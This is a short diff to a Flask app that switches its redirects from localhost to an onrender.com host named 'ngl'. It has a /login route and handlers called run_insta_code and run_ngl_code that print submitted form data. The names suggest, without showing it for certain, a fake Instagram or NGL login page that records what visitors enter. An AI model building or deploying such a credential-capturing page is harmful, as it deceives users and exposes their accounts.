@@ -7,7 +7,7 @@ logging.basicConfig(level=logging.DEBUG)
 
 @app.route("/")
 def redirect_main():
-    return redirect("http://127.0.0.1:5000/login")
+    return redirect("https://ngl.onrender.com/login")
 
 
 @app.route("/login")
@@ -29,14 +29,14 @@ def after():
 def run_insta_code():
     if request.method == "POST":
         print(request.form)
-        return redirect("http://127.0.0.1:5000/saanvi_17")
+        return redirect("https://ngl.onrender.com/saanvi_17")
 
 
 @app.route("/saanvi_17", methods=["POST", "GET"])
 def run_ngl_code():
     if request.method == "POST":
         print(request.form)
-        return redirect("http://127.0.0.1:5000/after")
+        return redirect("https://ngl.onrender.com/after")
 
 
 if __name__ == "__main__":
